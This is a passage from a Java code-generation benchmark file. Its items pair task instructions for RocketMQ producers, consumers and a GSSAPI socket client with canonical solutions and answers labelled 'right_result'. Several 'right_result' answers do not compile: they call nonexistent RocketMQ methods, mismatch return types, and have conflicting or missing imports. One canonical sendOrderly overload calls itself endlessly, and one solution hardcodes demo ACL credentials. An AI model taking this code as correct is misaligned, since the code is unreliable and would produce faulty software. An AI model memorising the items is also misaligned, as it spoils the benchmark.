    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport top.lrshuai.mq.comment.Const;\nimport top.lrshuai.mq.test.entity.AccountPlan;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class PlanConsumer {\n\n    @Value(\"${apache.rocketmq.consumer.PushConsumer}\")\n    private String consumerGroup;\n\n    @Value(\"${apache.rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n\n    private Logger logger = LoggerFactory.getLogger(this.getClass());\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        try {\n            consumer.subscribe(Const.PLAN_TOPIC, \"*\");\n            consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n            consumer.registerMessageListener((MessageListenerConcurrently) (list, context) -> {\n                MessageExt tempMsg = null;\n                try {\n                    for (MessageExt msg : list) {\n                        tempMsg = msg;\n                        String messageBody = new String(msg.getBody(), \"utf-8\");\n                        AccountPlan plan = JSON.parseObject(messageBody, AccountPlan.class);\n                        logger.info(\"\u6d88\u8d39\u6210\u529f\uff1amsgId={}\uff0cplan={}\", msg.getMsgId(), plan);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                    if(tempMsg.getReconsumeTimes() == 3) {\n                        logger.error(\"msg consume error by:{}\", tempMsg);\n                        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                    }\n                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            });\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;  \nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class PlanConsumer {\n    private static final int MAX_RETRY_ATTEMPTS = 3;\n    private static final Logger logger = LoggerFactory.getLogger(PlanConsumer.class);\n\n    @Value(\"${rocketmq.consumer.group}\")\n    private String consumerGroup;\n\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    public PlanConsumer() {}\n\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(\"*\", \"*\");\n        consumer.setConsumeMessageBatchMaxSize(1);\n        consumer.setConsumeOffsetPeriodically(interval -> {\n            logger.info(\"Consuming offset periodically with interval: {} ms\", interval);\n        });\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                try {\n                    processMessage(msg);\n                    logger.info(\"Successfully processed message: {}\", new String(msg.getBody()));\n                } catch (Exception e) {\n                    logger.error(\"Failed to process message: {}\", new String(msg.getBody()), e);\n                    if (retryMessage(msg)) {\n                        logger.info(\"Retrying message: {}\", new String(msg.getBody()));\n                    } else {\n                        logger.warn(\"Message failed after max retries: {}\", new String(msg.getBody()));\n                    }\n                }\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        try {\n            consumer.start();\n            logger.info(\"RocketMQ consumer started successfully.\");\n        } catch (Exception e) {\n            logger.error(\"Failed to start RocketMQ consumer.\", e);\n        }\n    }\n\n    private void processMessage(MessageExt msg) throws Exception {\n        // Implement your message processing logic here\n        throw new RuntimeException(\"Simulated message processing failure\");\n    }\n\n    private boolean retryMessage(MessageExt msg) {\n        int retryCount = 0;\n        while (retryCount < MAX_RETRY_ATTEMPTS) {\n            try {\n                processMessage(msg);\n                return true;\n            } catch (Exception e) {\n                logger.warn(\"Retrying message (Attempt {}): {}\", retryCount + 1, new String(msg.getBody()));\n                retryCount++;\n                try {\n                    Thread.sleep(1000); // Wait before retrying\n                } catch (InterruptedException ie) {\n                    Thread.currentThread().interrupt();\n                    logger.warn(\"Thread interrupted during retry delay.\", ie);\n                }\n            }\n        }\n        return false;\n    }\n}"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Create a Java function that demonstrates how to use RocketMQ's producer to send messages to a specified topic with ACL authentication.\n\nFunction Description: This function creates and configures a RocketMQ producer with ACL authentication, sends multiple messages to a specified topic, and then shuts down the producer. It demonstrates the basic workflow of message production including producer initialization, message creation, message sending, and resource cleanup.\n\nInput: None (The function uses predefined constants for configuration)\n\nOutput: None (The function prints send results to console but doesn't return any value)\n\nMethods:\n\nproducer: producer() -> void - Main function that creates and configures the producer, sends messages, and handles shutdown\ngetAclRPCHook: getAclRPCHook() -> RPCHook - Helper function that creates and returns an ACL authentication hook using predefined credentials",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.acl.common.AclClientRPCHook;\nimport org.apache.rocketmq.acl.common.SessionCredentials;\nimport org.apache.rocketmq.remoting.RPCHook;\n\nprivate static final String ACL_ACCESS_KEY = \"RocketMQ\";\nprivate static final String ACL_SECRET_KEY = \"1234567\";\n\npublic static void producer() throws MQClientException {\n    DefaultMQProducer producer = new DefaultMQProducer(\"ProducerGroupName\", getAclRPCHook());\n    producer.setNamesrvAddr(\"127.0.0.1:9876\");\n    producer.start();\n\n    for (int i = 0; i < 128; i++)\n        try {\n            {\n                Message msg = new Message(\"TopicTest\",\n                    \"TagA\",\n                    \"OrderID188\",\n                    \"Hello world\".getBytes(RemotingHelper.DEFAULT_CHARSET));\n                SendResult sendResult = producer.send(msg);\n                System.out.printf(\"%s%n\", sendResult);\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n    producer.shutdown();\n}\n\nstatic RPCHook getAclRPCHook() {\n    return new AclClientRPCHook(new SessionCredentials(ACL_ACCESS_KEY,ACL_SECRET_KEY));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.protocol.rpc.RPCHook;\n\npublic class RocketMQProducer {\n\n    private static final String PRODUCER_GROUP = \"producer_group\";\n    private static final String NAME_SERVER_ADDRESS = \"localhost:9876\";\n    private static final String TOPIC = \"test_topic\";\n    private static final String ACCESS_KEY = \"your_access_key\";\n    private static final String SECRET_KEY = \"your_secret_key\";\n\n    public void producer() {\n        DefaultMQProducer producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(NAME_SERVER_ADDRESS);\n        producer.setRPCHook(getAclRPCHook());\n\n        try {\n            producer.start();\n            for (int i = 0; i < 10; i++) {\n                Message msg = new Message(TOPIC, (\"Hello RocketMQ \" + i).getBytes());\n                boolean sendResult = producer.send(msg);\n                System.out.println(\"Message sent: \" + sendResult);\n            }\n        } catch (MQClientException | InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            producer.shutdown();\n        }\n    }\n\n    private RPCHook getAclRPCHook() {\n        return new RPCHook() {\n            @Override\n            public void invoke(Object args) {\n                // ACL authentication logic can be implemented here if needed\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer for sending order-related messages to a specified topic.\n\nClass Description: The OrderProducer class is a Spring component that initializes and manages a RocketMQ producer instance. It provides methods to send test order messages and actual order objects to a configured RocketMQ topic.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the RocketMQ NameServer (injected from properties)\n- topicName: String - The target topic name for messages (injected from properties)\n\nMethods:\n- init(): void - Initializes the producer instance with configuration settings and starts it. Uses @PostConstruct to ensure initialization after dependency injection.\n- send(): void - Sends 100 test order messages to the configured topic with incrementing tags.\n- send(HOrder order): boolean - Sends a serialized order object to the configured topic, using the order ID in the message tag. Returns true if sent successfully, false otherwise.\n\nInput:\n- For send(): None\n- For send(HOrder order): order - An HOrder object representing the order to be sent\n\nOutput:\n- For send(): None\n- For send(HOrder order): boolean - Indicates whether the message was successfully sent (true) or not (false)",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport com.camp.promotion.entity.HOrder;\nimport org.apache.rocketmq.client.exception.MQBrokerException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.exception.RemotingException;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.nio.charset.StandardCharsets;\n\n@Component\npublic class OrderProducer {\n\n    private DefaultMQProducer producer;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @PostConstruct\n    public void init() throws MQClientException {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(\"create_order_producer_group\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendFailed(3);\n        producer.setSendMsgTimeout(1000);\n        producer.start();\n    }\n\n    public void send() {\n        try {\n            for (int i = 0; i < 100; i++) {\n                String body = \"TEST_ORDER_\" + i;\n                Message message = new Message(topicName, \"create_order\" + i, body.getBytes(StandardCharsets.UTF_8));\n                SendResult sendResult = producer.send(message);\n            }\n        } catch (MQBrokerException | MQClientException | RemotingException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean send(HOrder order) {\n        byte[] body = JSON.toJSONBytes(order);\n        Message message = new Message(topicName, \"create_order\" + order.getId(), body);\n        SendResult sendResult;\n        try {\n            sendResult = producer.send(message);\n        } catch (MQClientException | RemotingException | MQBrokerException | InterruptedException e) {\n            return false;\n        }\n        return sendResult.getSendStatus() == SendStatus.SEND_OK;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class OrderProducer {\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n    private DefaultMQProducer producer;\n\n    public void init() {\n        producer = new DefaultMQProducer(\"OrderProducerGroup\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public void send() {\n        for (int i = 0; i < 100; i++) {\n            String tag = \"TEST_TAG_\" + i;\n            String msgBody = \"Test order message \" + i;\n            Message msg = new Message(topicName, tag, msgBody.getBytes());\n            try {\n                producer.send(msg);\n            } catch (MQClientException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public boolean send(HOrder order) {\n        try {\n            Message msg = new Message(topicName, \"ORDER_TAG_\" + order.getOrderId(), order.toString().getBytes());\n            producer.send(msg);\n            return true;\n        } catch (MQClientException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Create a Java class that serves as a template for interacting with RocketMQ producers, providing various methods to send messages (including ordered messages) with configurable parameters.\n\nClass Description: The RocketMQTemplate class is a utility class that simplifies interaction with RocketMQ producers. It manages producer instances, provides default configurations, and offers multiple methods for sending messages with different levels of customization. The class handles both regular and ordered message sending, with configurable timeouts, queue numbers, and producer groups.\n\nAttributes:\n- log: [InternalLogger] - Logger instance for error and debug logging\n- DEFAULT_PRODUCER_GROUP: [String] - Default producer group name\n- DEFAULT_QUEUE_NUM: [int] - Default number of queues\n- DEFAULT_SEND_MSG_TIMEOUT: [int] - Default message sending timeout in milliseconds\n- producerMap: [Map<String, DefaultMQProducer>] - Map storing producer instances with their configuration keys\n\nMethods:\n- getProducer() -> [DefaultMQProducer] - Gets a producer with default settings\n- getProducer([int queueNum]) -> [DefaultMQProducer] - Gets a producer with custom queue number\n- getProducer([String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a producer with custom group and timeout\n- getProducer([int queueNum, String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a fully customized producer\n- send([String topic, String body]) -> [SendResult] - Sends a message with default settings\n- send([String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom timeout\n- send([String producerGroup, String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom group and timeout\n- send([String producerGroup, String topic, String tags, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags\n- send([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags and keys\n- send([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending messages\n- sendOrderly([String producerGroup, String topic, String keys, String body]) -> [SendResult] - Sends ordered message with default timeout\n- sendOrderly([String producerGroup, String topic, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with custom timeout\n- sendOrderly([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with tags\n- sendOrderly([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending ordered messages",
    "Canonical_solution": "import org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.math.NumberUtils;\nimport org.apache.rocketmq.client.log.ClientLogger;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.InternalLogger;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RocketMQTemplate {\n\n    private static final InternalLogger log = ClientLogger.getLog();\n\n    private static final String DEFAULT_PRODUCER_GROUP = \"default-producer\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n\n    private static Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public static DefaultMQProducer getProducer() throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum) throws Exception {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) throws Exception {\n        if (queueNum < 1) throw new IllegalArgumentException(\"queueNum must >= 1\");\n        if (StringUtils.isBlank(producerGroup)) throw new IllegalArgumentException(\"producerGroup cannot be null\");\n        String producerKey = producerGroup + queueNum;\n        if (producerMap.get(producerKey) == null) {\n            synchronized (producerMap) {\n                if (producerMap.get(producerKey) == null) {\n                    DefaultMQProducer producer = new DefaultMQProducer(DEFAULT_PRODUCER_GROUP);\n                    producer.setDefaultTopicQueueNums(queueNum);\n                    producer.setSendMsgTimeout(sendMsgTimeout);\n                    producer.start();\n                    producerMap.put(producerKey, producer);\n                }\n            }\n        }\n        return producerMap.get(producerKey);\n    }\n\n    public static SendResult send(String topic, String body) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return send(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult send(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, keys, body, sendMsgTimeout);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return sendOrderly(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message,\n                new MessageQueueSelector() {\n                    @Override\n                    public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                        long id = NumberUtils.toLong(String.valueOf(arg));\n                        int index = (int) (id % mqs.size());\n                        return mqs.get(index);\n                    }\n                }, message.getKeys());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.common.message.SendResult;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.exception.MQClientException;\nimport org.slf4j.ILoggerFactory;\nimport org.slf4j.Logger;\n\nimport java.util.*;\n\npublic class RocketMQTemplate {\n    private static final Logger log = LoggerFactory.getLogger(RocketMQTemplate.class);\n    public static final String DEFAULT_PRODUCER_GROUP = \"DEFAULT_PRODUCER_GROUP\";\n    public static final int DEFAULT_QUEUE_NUM = 4;\n    public static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n    private final Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public DefaultMQProducer getProducer() {\n        return getProducer(DEFAULT_QUEUE_NUM);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum) {\n        String key = \"queue_\" + queueNum;\n        if (!producerMap.containsKey(key)) {\n            DefaultMQProducer producer = new DefaultMQProducer(DEFAULT_PRODUCER_GROUP);\n            producer.setSendMsgTimeout(DEFAULT_SEND_MSG_TIMEOUT);\n            producer.setRetryTimesWhenSendFailed(2);\n            producer.setVipChannelEnabled(false);\n            producer.setNamesrvAddr(\"localhost:9876\");\n            producer.setQueueNums(queueNum);\n            try {\n                producer.start();\n            } catch (MQClientException e) {\n                log.error(\"Failed to start producer with queue number {}\", queueNum, e);\n            }\n            producerMap.put(key, producer);\n        }\n        return producerMap.get(key);\n    }\n\n    public DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) {\n        String key = \"group_\" + producerGroup + \"_timeout_\" + sendMsgTimeout;\n        if (!producerMap.containsKey(key)) {\n            DefaultMQProducer producer = new DefaultMQProducer(producerGroup);\n            producer.setSendMsgTimeout(sendMsgTimeout);\n            producer.setRetryTimesWhenSendFailed(2);\n            producer.setVipChannelEnabled(false);\n            producer.setNamesrvAddr(\"localhost:9876\");\n            producer.setQueueNums(DEFAULT_QUEUE_NUM);\n            try {\n                producer.start();\n            } catch (MQClientException e) {\n                log.error(\"Failed to start producer with group {} and timeout {}\", producerGroup, sendMsgTimeout, e);\n            }\n            producerMap.put(key, producer);\n        }\n        return producerMap.get(key);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) {\n        String key = \"queue_\" + queueNum + \"_group_\" + producerGroup + \"_timeout_\" + sendMsgTimeout;\n        if (!producerMap.containsKey(key)) {\n            DefaultMQProducer producer = new DefaultMQProducer(producerGroup);\n            producer.setSendMsgTimeout(sendMsgTimeout);\n            producer.setRetryTimesWhenSendFailed(2);\n            producer.setVipChannelEnabled(false);\n            producer.setNamesrvAddr(\"localhost:9876\");\n            producer.setQueueNums(queueNum);\n            try {\n                producer.start();\n            } catch (MQClientException e) {\n                log.error(\"Failed to start producer with queue number {}, group {}, and timeout {}\", queueNum, producerGroup, sendMsgTimeout, e);\n            }\n            producerMap.put(key, producer);\n        }\n        return producerMap.get(key);\n    }\n\n    public SendResult send(String topic, String body) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, null, null, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n        Message message = new Message(topic, tags, keys, body.getBytes());\n        return send(producer, message, sendMsgTimeout);\n    }\n\n    public SendResult send(DefaultMQProducer producer, Message message, int sendMsgTimeout) {\n        try {\n            return producer.send(message, sendMsgTimeout);\n        } catch (MQClientException | InterruptedException e) {\n            log.error(\"Failed to send message with producer {}, message {}\", producer, message, e);\n            throw new RuntimeException(\"Failed to send message\", e);\n        }\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, null, keys, body, sendMsgTimeout);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n        Message message = new Message(topic, tags, keys, body.getBytes());\n        return sendOrderly(producer, message, sendMsgTimeout);\n    }\n\n    public SendResult sendOrderly(DefaultMQProducer producer, Message message, int sendMsgTimeout) {\n        try {\n            return producer.sendOrderly(message, sendMsgTimeout);\n        } catch (MQClientException | InterruptedException e) {\n            log.error(\"Failed to send ordered message with producer {}, message {}\", producer, message, e);\n            throw new RuntimeException(\"Failed to send ordered message\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 398,
    "Instruction": "Task Description: Implement a Java class that establishes a secure TCP client connection using GSSAPI for authentication and secure message exchange with a server.\n\nClass Description: The GSSClient class provides functionality to connect to a server using TCP, establish a secure GSSAPI context, send encrypted messages, and verify received messages. It handles GSSAPI authentication and secure communication over a socket connection.\n\nAttributes:\n- s: Socket - The socket used for TCP communication with the server\n\nMethods:\n- main(String[] args) -> void - Entry point that parses command line arguments, establishes connection, and manages the secure communication flow\n- createCtxt(String serverName, Oid mechOid) -> GSSContext - Creates and establishes a GSSAPI security context with the server\n- sendMsgToPeer(GSSContext aCtxt, String msg) -> void - Sends an encrypted message to the server using the established security context\n- verifyMsgFromPeer(GSSContext aCtxt, String msg) -> void - Verifies the message integrity code (MIC) received from the server\n- usage() -> void - Prints usage information for the program\n- print(String msg) -> void - Helper method to print messages to standard output\n- exit(int status) -> void - Closes the socket connection and exits the program with specified status code",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\nimport com.sun.gssapi.*;\n\nclass GSSClient {\n\n    private static Socket s;\n\n    public static void main(String args[]) {\n        String serverHost, serverName, message;\n        int port = 4444;\n\n        if (args.length < 3) {\n            usage();\n            exit(1);\n        }\n\n        serverHost = args[args.length - 3];\n        serverName = args[args.length - 2];\n        message = args[args.length - 1];\n        \n        try {\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < (args.length - 3); i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            s = new Socket(serverHost, port);\n            GSSContext aCtxt = createCtxt(serverName, mechOid);\n            sendMsgToPeer(aCtxt, message);                        \n            verifyMsgFromPeer(aCtxt, message);\n            aCtxt.dispose();\n            exit(0);\n\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static GSSContext createCtxt(String serverName, Oid mechOid)\n                    throws GSSException, IOException {\n        GSSContext aCtxt = new GSSContext(\n            new GSSName(serverName, GSSName.NT_HOSTBASED_SERVICE),\n                      mechOid, null, 0);\n\n        aCtxt.requestConf(true);\n        aCtxt.requestInteg(true);\n        aCtxt.requestMutualAuth(true);\n        aCtxt.requestReplayDet(true);\n        aCtxt.requestSequenceDet(true);\n        \n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n\n        byte []inTok = new byte[0];\n        \n        do {\n            byte[] outTok = aCtxt.init(inTok, 0, inTok.length);\n            \n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok, 0, outTok.length);\n            }\n            \n            if (aCtxt.isEstablished())\n                break;\n            \n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n            \n        return (aCtxt);\n    }\n\n    private static void sendMsgToPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        MessageProp mInfo = new MessageProp(0, true);\n        byte []tok = aCtxt.wrap(msg.getBytes(), 0, msg.length(), mInfo);\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n        dos.writeInt(tok.length);\n        dos.write(tok);\n        dos.flush();\n    }\n\n    private static void verifyMsgFromPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        int len = dis.readInt();\n        MessageProp mInfo = new MessageProp();\n        aCtxt.verifyMIC(dis, new StringBufferInputStream(msg), mInfo);\n    }\n\n    private static void usage() {\n        print(\"GSSClient [-port port] [-mech 1.2.3.3] serverhost servername message\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
